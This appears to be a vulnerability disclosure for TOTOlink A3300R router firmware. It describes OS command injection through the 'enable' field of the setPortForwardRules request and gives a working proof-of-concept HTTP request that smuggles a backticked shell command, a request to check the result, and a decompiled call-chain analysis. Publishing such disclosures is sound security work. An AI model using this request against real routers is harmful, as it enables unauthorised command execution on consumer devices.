# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](D:\typora 图片\image-20240109124617070.png)

## Vulnerability Description

When deal with  `setPortForwardRules` request,`enable` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1
Host: itotolink.net
Content-Length: 83
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://itotolink.net
Referer: http://itotolink.net/advance/portfwd.html?token=C6F41C563E86A379
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"enable":"1`ls>/web/cmdi10.txt`","addEffect":"0","topicurl":"setPortForwardRules"}
```

injection the command "ls>/web/cmdi10.txt"

![image-20240119135547393](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/10/img/image-20240119135547393.png)

check the result.

```
GET /cmdi10.txt HTTP/1.1
Host: itotolink.net
If-Modified-Since: Mon, 24 Oct 2022 09:43:03 GMT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/css,*/*;q=0.1
Referer: http://itotolink.net/advance/portfwd.html?token=C6F41C563E86A379
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

![image-20240119135553027](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/10/img/image-20240119135553027.png)

## Analysis

sub_41BFB8 will handle the `setPortForwardRules` request. sub_41BFB8 get `enable` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240119135952091](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/10/img/image-20240119135952091.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/8/img/image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/8/img/image-20240109131330610.png)

